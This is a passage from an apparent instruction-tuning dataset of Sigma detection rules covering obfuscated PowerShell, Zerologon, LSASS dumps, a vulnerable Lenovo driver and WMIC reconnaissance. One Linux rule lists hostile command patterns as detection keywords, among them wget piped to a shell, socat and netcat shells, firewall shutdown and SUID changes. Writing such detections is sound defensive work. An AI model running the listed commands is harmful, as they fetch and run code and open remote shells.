    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of Environment Variables to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of environment variables to execute PowerShell, you should monitor Windows PowerShell modules for specific patterns of command execution that attempt to disguise their activities. This involves looking for commands that use the `cmd` utility with either `/c` or `/r` options followed by a set of characters indicating an attempt to set an environment variable. The pattern to watch involves a complex structure where the `set` command is used with a variable name ranging from three to six characters in length, immediately followed by a secretive usage of curly braces and numbers (indicating an attempt at obfuscation by accessing environment variables in an unusual way) and then proceeding with a `-f` option possibly indicating formatting or further command instructions contained within parentheses.\n\nThis detection relies on observing command-line parameters that fit the above description within the PowerShell module logs (`ps_module` category) on Windows systems. Such activities can be indicative of attempts to evade detection by using environment variables in non-standard ways to execute malicious PowerShell scripts or commands.\n\nIn terms of cybersecurity, these activities are associated with tactics and techniques that include but are not limited to Execution, Defense Evasion, and possibly Discovery if the attackers are probing the environment variables for information. While it's recognized that there may be unknown legitimate use cases that could potentially trigger this detection pattern, the level of threat is considered high due to the sophisticated nature of the obfuscation techniques used. Therefore, any hits on this pattern demands thorough investigation to rule out or confirm malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|re: '.*cmd.{0,5}(?:/c|/r)(?:\\s|)\"set\\s[a-zA-Z]{3,6}.*(?:\\{\\d\\}){1,}\\\\\"\\s+?-f(?:.*\\)){1,}.*\"'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|re: '.*cmd.{0,5}(?:/c|/r)(?:\\s|)\"set\\s[a-zA-Z]{3,6}.*(?:\\{\\d\\}){1,}\\\\\"\\s+?-f(?:.*\\)){1,}.*\"'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of Environment Variables to execute PowerShell",
      "answer": "In order to detect obfuscated use of environment variables to execute PowerShell, you should monitor Windows PowerShell modules for specific patterns of command execution that attempt to disguise their activities. This involves looking for commands that use the `cmd` utility with either `/c` or `/r` options followed by a set of characters indicating an attempt to set an environment variable. The pattern to watch involves a complex structure where the `set` command is used with a variable name ranging from three to six characters in length, immediately followed by a secretive usage of curly braces and numbers (indicating an attempt at obfuscation by accessing environment variables in an unusual way) and then proceeding with a `-f` option possibly indicating formatting or further command instructions contained within parentheses.\n\nThis detection relies on observing command-line parameters that fit the above description within the PowerShell module logs (`ps_module` category) on Windows systems. Such activities can be indicative of attempts to evade detection by using environment variables in non-standard ways to execute malicious PowerShell scripts or commands.\n\nIn terms of cybersecurity, these activities are associated with tactics and techniques that include but are not limited to Execution, Defense Evasion, and possibly Discovery if the attackers are probing the environment variables for information. While it's recognized that there may be unknown legitimate use cases that could potentially trigger this detection pattern, the level of threat is considered high due to the sophisticated nature of the obfuscation techniques used. Therefore, any hits on this pattern demands thorough investigation to rule out or confirm malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472, you should focus on monitoring the Windows System event logs, specifically seeking out events generated by the NetLogon service. Look for events with the Provider Name set to NetLogon and an Event ID of 5829. This Event ID is crucial as it indicates that a vulnerable Netlogon secure channel connection was permitted, which is a potential sign of an exploit attempt related to CVE-2020-1472, a critical vulnerability often referred to as \"Zerologon.\" This attack takes advantage of flaws in the Netlogon authentication process to potentially allow attackers to breach or disrupt services. It's important to capture the SAMAccountName field in the logs, as it contains the Security Account Manager (SAM) account name of the user or service involved in the event, providing further context to the incident. The level of concern for these findings is categorized as high due to the severe implications associated with CVE-2020-1472 exploitation attempts. Since detection can involve false positives, although they are not specified, it implies a need for subsequent investigation to confirm any suspected exploit activity. Understanding and monitoring for this activity is crucial for maintaining the security and integrity of Windows environments, particularly those utilizing Active Directory services.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: NetLogon  # Active Directory: NetLogon ETW GUID {F33959B4-DBEC-11D2-895B-00C04F79AB69}\n        EventID: 5829\n    condition: selection\nfalsepositives:\n    - Unknown\nfields:\n    - SAMAccountName\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: NetLogon  # Active Directory: NetLogon ETW GUID {F33959B4-DBEC-11D2-895B-00C04F79AB69}\n        EventID: 5829\n    condition: selection\nfalsepositives:\n    - Unknown\nfields:\n    - SAMAccountName\nlevel: high\n",
      "question": "that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472.",
      "answer": "In order to detect that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472, you should focus on monitoring the Windows System event logs, specifically seeking out events generated by the NetLogon service. Look for events with the Provider Name set to NetLogon and an Event ID of 5829. This Event ID is crucial as it indicates that a vulnerable Netlogon secure channel connection was permitted, which is a potential sign of an exploit attempt related to CVE-2020-1472, a critical vulnerability often referred to as \"Zerologon.\" This attack takes advantage of flaws in the Netlogon authentication process to potentially allow attackers to breach or disrupt services. It's important to capture the SAMAccountName field in the logs, as it contains the Security Account Manager (SAM) account name of the user or service involved in the event, providing further context to the incident. The level of concern for these findings is categorized as high due to the severe implications associated with CVE-2020-1472 exploitation attempts. Since detection can involve false positives, although they are not specified, it implies a need for subsequent investigation to confirm any suspected exploit activity. Understanding and monitoring for this activity is crucial for maintaining the security and integrity of Windows environments, particularly those utilizing Active Directory services."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting device in azure is no longer managed or compliant.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when a device in Azure is no longer managed or compliant, you should: monitor the Azure activity logs for any messages indicating that a device is \"no longer compliant\" or \"no longer managed.\" These messages serve as a potential indication of compliance issues or changes in device management status which could impact security posture. It's important, however, to consider that these alerts can sometimes be triggered by administrative oversights, such as forgetting to review a device's status. This scenario has been assessed with a medium level of concern due to the balance between potential security implications and the likelihood of benign triggers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        properties.message:\n            - Device no longer compliant\n            - Device no longer managed\n    condition: selection\nfalsepositives:\n    - Administrator may have forgotten to review the device.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        properties.message:\n            - Device no longer compliant\n            - Device no longer managed\n    condition: selection\nfalsepositives:\n    - Administrator may have forgotten to review the device.\nlevel: medium\n",
      "question": "device in azure is no longer managed or compliant",
      "answer": "In order to identify when a device in Azure is no longer managed or compliant, you should: monitor the Azure activity logs for any messages indicating that a device is \"no longer compliant\" or \"no longer managed.\" These messages serve as a potential indication of compliance issues or changes in device management status which could impact security posture. It's important, however, to consider that these alerts can sometimes be triggered by administrative oversights, such as forgetting to review a device's status. This scenario has been assessed with a medium level of concern due to the balance between potential security implications and the likelihood of benign triggers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting load of the vulnerable Lenovo driver as reported in CVE-2022-3699 which can be used to escalate privileges.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the load of the vulnerable Lenovo driver as reported in CVE-2022-3699 which can be used to escalate privileges, you should monitor the loading of drivers on Windows systems, particularly for specific hash values that identify the compromised Lenovo driver. Ensure that both Sysmon logs and other hash monitoring systems are checked for the presence of any of the following hashes: SHA256 hash of 'F05B1EE9E2F6AB704B8919D5071BECBCE6F9D0F9D0BA32A460C41D5272134ABE', SHA1 hash of 'B89A8EEF5AEAE806AF5BA212A8068845CAFDAB6F', or an MD5 hash of 'B941C8364308990EE4CC6EADF7214E0F'. These specific hashes indicate the loading of a particular driver that has been identified as vulnerable and potentially being exploited for privilege escalation purposes. Note that while detecting these hashes is critical for security, it's possible to encounter false positives in scenarios where legitimate driver loads occur (particularly with drivers that haven't been updated). Given the high risk associated with this vulnerable driver, the detection of any of these hashes should be treated with a high priority level to mitigate potential security threats effectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: driver_load\n    product: windows\ndetection:\n    selection_sysmon:\n        Hashes|contains:\n            - 'SHA256=F05B1EE9E2F6AB704B8919D5071BECBCE6F9D0F9D0BA32A460C41D5272134ABE'\n            - 'SHA1=B89A8EEF5AEAE806AF5BA212A8068845CAFDAB6F'\n            - 'MD5=B941C8364308990EE4CC6EADF7214E0F'\n    selection_hash:\n        - sha256: 'f05b1ee9e2f6ab704b8919d5071becbce6f9d0f9d0ba32a460c41d5272134abe'\n        - sha1: 'b89a8eef5aeae806af5ba212a8068845cafdab6f'\n        - md5: 'b941c8364308990ee4cc6eadf7214e0f'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate driver loads (old driver that didn't receive an update)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: driver_load\n    product: windows\ndetection:\n    selection_sysmon:\n        Hashes|contains:\n            - 'SHA256=F05B1EE9E2F6AB704B8919D5071BECBCE6F9D0F9D0BA32A460C41D5272134ABE'\n            - 'SHA1=B89A8EEF5AEAE806AF5BA212A8068845CAFDAB6F'\n            - 'MD5=B941C8364308990EE4CC6EADF7214E0F'\n    selection_hash:\n        - sha256: 'f05b1ee9e2f6ab704b8919d5071becbce6f9d0f9d0ba32a460c41d5272134abe'\n        - sha1: 'b89a8eef5aeae806af5ba212a8068845cafdab6f'\n        - md5: 'b941c8364308990ee4cc6eadf7214e0f'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate driver loads (old driver that didn't receive an update)\nlevel: high\n",
      "question": "load of the vulnerable Lenovo driver as reported in CVE-2022-3699 which can be used to escalate privileges",
      "answer": "In order to detect the load of the vulnerable Lenovo driver as reported in CVE-2022-3699 which can be used to escalate privileges, you should monitor the loading of drivers on Windows systems, particularly for specific hash values that identify the compromised Lenovo driver. Ensure that both Sysmon logs and other hash monitoring systems are checked for the presence of any of the following hashes: SHA256 hash of 'F05B1EE9E2F6AB704B8919D5071BECBCE6F9D0F9D0BA32A460C41D5272134ABE', SHA1 hash of 'B89A8EEF5AEAE806AF5BA212A8068845CAFDAB6F', or an MD5 hash of 'B941C8364308990EE4CC6EADF7214E0F'. These specific hashes indicate the loading of a particular driver that has been identified as vulnerable and potentially being exploited for privilege escalation purposes. Note that while detecting these hashes is critical for security, it's possible to encounter false positives in scenarios where legitimate driver loads occur (particularly with drivers that haven't been updated). Given the high risk associated with this vulnerable driver, the detection of any of these hashes should be treated with a high priority level to mitigate potential security threats effectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious shell commands used in various exploit codes (see references).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious shell commands used in various exploit codes, you should monitor for specific command patterns within Linux systems. These patterns include:\n\n- Use of `wget` to download files followed by immediately executing them with `perl`, `sh`, or `bash`. This could indicate an attempt to fetch and run malicious scripts.\n- Execution of Python's SimpleHTTPServer or http.server modules which may suggest serving files from the compromised system, often used in data exfiltration or serving malicious content.\n- Invocations that involve `pty` module for spawning pseudo-terminal sessions, and `socat` commands which could be used for creating reverse shells or binding shells to a port, indicating possible remote command execution attempts.\n- Commands that alter binary files with `echo` or change permissions of files with `chmod` to make them executable, specifically in directories like `/tmp`, `/var/run`, or `/mnt`, are signs of attempts to execute or persist malware.\n- Specific patterns related to disabling firewall services (`iptables`, `SuSEfirewall2`), modifying `/etc/rc.local` for persistence, or commands typically associated with the Metasploit framework's exploit payloads such as decoding base64-encoded files, setting SUID bit on binaries, or running network listeners with `nc` are key indicators of exploitation attempts.\n- Other suspicious activities like copying shell binaries (`ksh`, `sh`) into other locations, executing or making executable various suspicious files within `/tmp` directory, including those with extensions or names related to common exploit tools (e.g., `.b64`, `ysocereal.jar`, `x`) could signal post-exploitation movements or an attempt to establish persistence.\n\nBe aware of false positives, as legitimate administration activities might occasionally use parts of these commands. However, the commands listed are generally considered high-risk and warrant investigation if detected. Monitoring for these command patterns helps in identifying potential security breaches or exploit attempts in their early stages.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        # Generic suspicious commands\n        - 'wget * - http* | perl'\n        - 'wget * - http* | sh'\n        - 'wget * - http* | bash'\n        - 'python -m SimpleHTTPServer'\n        - '-m http.server'      # Python 3\n        - 'import pty; pty.spawn*'\n        - 'socat exec:*'\n        - 'socat -O /tmp/*'\n        - 'socat tcp-connect*'\n        - '*echo binary >>*'\n        # Malware\n        - '*wget *; chmod +x*'\n        - '*wget *; chmod 777 *'\n        - '*cd /tmp || cd /var/run || cd /mnt*'\n        # Apache Struts in-the-wild exploit codes\n        - '*stop;service iptables stop;*'\n        - '*stop;SuSEfirewall2 stop;*'\n        - 'chmod 777 2020*'\n        - '*>>/etc/rc.local'\n        # Metasploit framework exploit codes\n        - '*base64 -d /tmp/*'\n        - '* | base64 -d *'\n        - '*/chmod u+s *'\n        - '*chmod +s /tmp/*'\n        - '*chmod u+s /tmp/*'\n        - '* /tmp/haxhax*'\n        - '* /tmp/ns_sploit*'\n        - 'nc -l -p *'\n        - 'cp /bin/ksh *'\n        - 'cp /bin/sh *'\n        - '* /tmp/*.b64 *'\n        - '*/tmp/ysocereal.jar*'\n        - '*/tmp/x *'\n        - '*; chmod +x /tmp/*'\n        - '*;chmod +x /tmp/*'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        # Generic suspicious commands\n        - 'wget * - http* | perl'\n        - 'wget * - http* | sh'\n        - 'wget * - http* | bash'\n        - 'python -m SimpleHTTPServer'\n        - '-m http.server'      # Python 3\n        - 'import pty; pty.spawn*'\n        - 'socat exec:*'\n        - 'socat -O /tmp/*'\n        - 'socat tcp-connect*'\n        - '*echo binary >>*'\n        # Malware\n        - '*wget *; chmod +x*'\n        - '*wget *; chmod 777 *'\n        - '*cd /tmp || cd /var/run || cd /mnt*'\n        # Apache Struts in-the-wild exploit codes\n        - '*stop;service iptables stop;*'\n        - '*stop;SuSEfirewall2 stop;*'\n        - 'chmod 777 2020*'\n        - '*>>/etc/rc.local'\n        # Metasploit framework exploit codes\n        - '*base64 -d /tmp/*'\n        - '* | base64 -d *'\n        - '*/chmod u+s *'\n        - '*chmod +s /tmp/*'\n        - '*chmod u+s /tmp/*'\n        - '* /tmp/haxhax*'\n        - '* /tmp/ns_sploit*'\n        - 'nc -l -p *'\n        - 'cp /bin/ksh *'\n        - 'cp /bin/sh *'\n        - '* /tmp/*.b64 *'\n        - '*/tmp/ysocereal.jar*'\n        - '*/tmp/x *'\n        - '*; chmod +x /tmp/*'\n        - '*;chmod +x /tmp/*'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious shell commands used in various exploit codes (see references)",
      "answer": "In order to detect suspicious shell commands used in various exploit codes, you should monitor for specific command patterns within Linux systems. These patterns include:\n\n- Use of `wget` to download files followed by immediately executing them with `perl`, `sh`, or `bash`. This could indicate an attempt to fetch and run malicious scripts.\n- Execution of Python's SimpleHTTPServer or http.server modules which may suggest serving files from the compromised system, often used in data exfiltration or serving malicious content.\n- Invocations that involve `pty` module for spawning pseudo-terminal sessions, and `socat` commands which could be used for creating reverse shells or binding shells to a port, indicating possible remote command execution attempts.\n- Commands that alter binary files with `echo` or change permissions of files with `chmod` to make them executable, specifically in directories like `/tmp`, `/var/run`, or `/mnt`, are signs of attempts to execute or persist malware.\n- Specific patterns related to disabling firewall services (`iptables`, `SuSEfirewall2`), modifying `/etc/rc.local` for persistence, or commands typically associated with the Metasploit framework's exploit payloads such as decoding base64-encoded files, setting SUID bit on binaries, or running network listeners with `nc` are key indicators of exploitation attempts.\n- Other suspicious activities like copying shell binaries (`ksh`, `sh`) into other locations, executing or making executable various suspicious files within `/tmp` directory, including those with extensions or names related to common exploit tools (e.g., `.b64`, `ysocereal.jar`, `x`) could signal post-exploitation movements or an attempt to establish persistence.\n\nBe aware of false positives, as legitimate administration activities might occasionally use parts of these commands. However, the commands listed are generally considered high-risk and warrant investigation if detected. Monitoring for these command patterns helps in identifying potential security breaches or exploit attempts in their early stages."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting import of '.reg' files from suspicious paths using the 'reg.exe' utility.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the import of '.reg' files from suspicious paths using the 'reg.exe' utility, you should monitor the creation of processes on Windows systems, specifically looking for instances where the 'reg.exe' utility is executed. Pay close attention to the command line used during the process creation, particularly watching for the use of ' import ' as this indicates the importation of registry keys. Equally important is to scrutinize the paths from which these '.reg' files are being imported. Common pathways for suspicious activity include user directories like 'C:\\Users\\', temporary folders such as '%temp%', '%tmp%', system application data folders like '%appdata%' and specific paths including '\\AppData\\Local\\Temp\\', 'C:\\Windows\\Temp\\', and 'C:\\ProgramData\\'. All these elements combined indicate potentially malicious action. However, bear in mind that there are legitimate uses for importing keys, and these should be considered as possible false positives. The importance of this detection process is rated as medium due to its potential for flagging normal administrative activities as suspicious.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_cli:\n        CommandLine|contains: ' import '\n    selection_paths:\n        CommandLine|contains:\n            - 'C:\\Users\\'\n            - '%temp%'\n            - '%tmp%'\n            - '%appdata%'\n            - '\\AppData\\Local\\Temp\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\ProgramData\\'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate import of keys\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_cli:\n        CommandLine|contains: ' import '\n    selection_paths:\n        CommandLine|contains:\n            - 'C:\\Users\\'\n            - '%temp%'\n            - '%tmp%'\n            - '%appdata%'\n            - '\\AppData\\Local\\Temp\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\ProgramData\\'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate import of keys\nlevel: medium\n",
      "question": "import of '.reg' files from suspicious paths using the 'reg.exe' utility",
      "answer": "In order to detect the import of '.reg' files from suspicious paths using the 'reg.exe' utility, you should monitor the creation of processes on Windows systems, specifically looking for instances where the 'reg.exe' utility is executed. Pay close attention to the command line used during the process creation, particularly watching for the use of ' import ' as this indicates the importation of registry keys. Equally important is to scrutinize the paths from which these '.reg' files are being imported. Common pathways for suspicious activity include user directories like 'C:\\Users\\', temporary folders such as '%temp%', '%tmp%', system application data folders like '%appdata%' and specific paths including '\\AppData\\Local\\Temp\\', 'C:\\Windows\\Temp\\', and 'C:\\ProgramData\\'. All these elements combined indicate potentially malicious action. However, bear in mind that there are legitimate uses for importing keys, and these should be considered as possible false positives. The importance of this detection process is rated as medium due to its potential for flagging normal administrative activities as suspicious."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting presence of an LSASS dump file in the \"CrashDumps\" folder. This could be a sign of LSASS credential dumping. Techniques such as the LSASS Shtinkering have been seen abusing the Windows Error Reporting to dump said process..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the presence of an LSASS dump file in the \"CrashDumps\" folder, which could be a sign of LSASS credential dumping, you should monitor Windows file events specifically in the category of file_event. Look for files in the 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\CrashDumps\\' path that contain 'lsass.exe.' in their names and end with '.dmp'. Such activities often indicate LSASS credential dumping practices, including techniques like LSASS Shtinkering that exploit Windows Error Reporting for malicious process dumping. Be aware that there could be rare instances where the operating system legitimately dumps the LSASS process due to a crash, which should be considered a potential false positive. Nonetheless, given the high-risk level associated with this detection, it is crucial to pay close attention to such occurrences as they commonly relate to tactics and techniques aiming to exploit credential access.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\CrashDumps\\'\n        TargetFilename|contains: 'lsass.exe.'\n        TargetFilename|endswith: '.dmp'\n    condition: selection\nfalsepositives:\n    - Rare legitimate dump of the process by the operating system due to a crash of lsass\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\CrashDumps\\'\n        TargetFilename|contains: 'lsass.exe.'\n        TargetFilename|endswith: '.dmp'\n    condition: selection\nfalsepositives:\n    - Rare legitimate dump of the process by the operating system due to a crash of lsass\nlevel: high\n",
      "question": "presence of an LSASS dump file in the \"CrashDumps\" folder. This could be a sign of LSASS credential dumping. Techniques such as the LSASS Shtinkering have been seen abusing the Windows Error Reporting to dump said process.",
      "answer": "In order to detect the presence of an LSASS dump file in the \"CrashDumps\" folder, which could be a sign of LSASS credential dumping, you should monitor Windows file events specifically in the category of file_event. Look for files in the 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\CrashDumps\\' path that contain 'lsass.exe.' in their names and end with '.dmp'. Such activities often indicate LSASS credential dumping practices, including techniques like LSASS Shtinkering that exploit Windows Error Reporting for malicious process dumping. Be aware that there could be rare instances where the operating system legitimately dumps the LSASS process due to a crash, which should be considered a potential false positive. Nonetheless, given the high-risk level associated with this detection, it is crucial to pay close attention to such occurrences as they commonly relate to tactics and techniques aiming to exploit credential access."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting rundll32 loading a renamed comsvcs.dll to dump process memory.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect rundll32 loading a renamed comsvcs.dll to dump process memory, you should monitor Windows image load events for the loading of 'rundll32.exe'. Specifically, look for events where 'rundll32.exe' is being loaded with specific hash values that match known versions of Windows\u2014including Windows 11 21H2 x64, Windows 10 1607, Windows 10 1809, Windows 10 2004 x64, and Windows 10 2004 x86. It's critical to identify these specific instances because they indicate the execution of rundll32 that could be employed to dump process memory, a technique commonly utilized in malicious activities. Additionally, you must ensure that these detections are not associated with the legitimate loading of 'comsvcs.dll', as this DLL can be loaded by 'rundll32.exe' in normal, benign circumstances. To reduce false positives and focus on potential malicious activity, confirm that the 'ImageLoaded' does not end with '\\comsvcs.dll'. Given these parameters, this approach is deemed highly reliable in identifying suspicious activities related to memory dumping via rundll32 without catching legitimate system behavior.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        Image|endswith: '\\rundll32.exe'\n        Hashes|contains:\n            # Add more hashes for other windows versions\n            - IMPHASH=eed93054cb555f3de70eaa9787f32ebb # Windows 11 21H2 x64\n            - IMPHASH=5e0dbdec1fce52daae251a110b4f309d # Windows 10 1607\n            - IMPHASH=eadbccbb324829acb5f2bbe87e5549a8 # Windows 10 1809\n            - IMPHASH=407ca0f7b523319d758a40d7c0193699 # Windows 10 2004 x64\n            - IMPHASH=281d618f4e6271e527e6386ea6f748de # Windows 10 2004 x86\n    filter:\n        ImageLoaded|endswith: '\\comsvcs.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        Image|endswith: '\\rundll32.exe'\n        Hashes|contains:\n            # Add more hashes for other windows versions\n            - IMPHASH=eed93054cb555f3de70eaa9787f32ebb # Windows 11 21H2 x64\n            - IMPHASH=5e0dbdec1fce52daae251a110b4f309d # Windows 10 1607\n            - IMPHASH=eadbccbb324829acb5f2bbe87e5549a8 # Windows 10 1809\n            - IMPHASH=407ca0f7b523319d758a40d7c0193699 # Windows 10 2004 x64\n            - IMPHASH=281d618f4e6271e527e6386ea6f748de # Windows 10 2004 x86\n    filter:\n        ImageLoaded|endswith: '\\comsvcs.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "rundll32 loading a renamed comsvcs.dll to dump process memory",
      "answer": "In order to detect rundll32 loading a renamed comsvcs.dll to dump process memory, you should monitor Windows image load events for the loading of 'rundll32.exe'. Specifically, look for events where 'rundll32.exe' is being loaded with specific hash values that match known versions of Windows\u2014including Windows 11 21H2 x64, Windows 10 1607, Windows 10 1809, Windows 10 2004 x64, and Windows 10 2004 x86. It's critical to identify these specific instances because they indicate the execution of rundll32 that could be employed to dump process memory, a technique commonly utilized in malicious activities. Additionally, you must ensure that these detections are not associated with the legitimate loading of 'comsvcs.dll', as this DLL can be loaded by 'rundll32.exe' in normal, benign circumstances. To reduce false positives and focus on potential malicious activity, confirm that the 'ImageLoaded' does not end with '\\comsvcs.dll'. Given these parameters, this approach is deemed highly reliable in identifying suspicious activities related to memory dumping via rundll32 without catching legitimate system behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An adversary might use WMI to check if a certain remote service is running on a remote device.\nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable\" if the provided remote host is unreachable\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an adversary might use Windows Management Instrumentation (WMI) to check if a certain remote service is running on a remote device, you should: monitor for the creation of processes that end with '\\WMIC.exe' or have an original filename of 'wmic.exe'. Additionally, it's important to look for command lines that contain the word 'service'. These observations indicate that someone is likely using the WMIC tool to query remote services, which can be a sign of reconnaissance activity as part of a broader campaign to understand the network environment and potentially identify vulnerable services for exploitation. The feedback from such a query might indicate whether a service is running, not present, or if the remote host is unreachable, commonly noted by messages like \"No instance(s) Available\" or \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable.\" This monitoring should be applied to systems running Windows, given the use of WMIC. The level of concern for such activities is considered medium, and while there may be legitimate uses for querying service information remotely, it's essential to review these activities to rule out malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'service'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'service'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "An adversary might use WMI to check if a certain remote service is running on a remote device.\nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable\" if the provided remote host is unreachable\n",
      "answer": "In order to detect when an adversary might use Windows Management Instrumentation (WMI) to check if a certain remote service is running on a remote device, you should: monitor for the creation of processes that end with '\\WMIC.exe' or have an original filename of 'wmic.exe'. Additionally, it's important to look for command lines that contain the word 'service'. These observations indicate that someone is likely using the WMIC tool to query remote services, which can be a sign of reconnaissance activity as part of a broader campaign to understand the network environment and potentially identify vulnerable services for exploitation. The feedback from such a query might indicate whether a service is running, not present, or if the remote host is unreachable, commonly noted by messages like \"No instance(s) Available\" or \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable.\" This monitoring should be applied to systems running Windows, given the use of WMIC. The level of concern for such activities is considered medium, and while there may be legitimate uses for querying service information remotely, it's essential to review these activities to rule out malicious intent."
    }
  },
  {
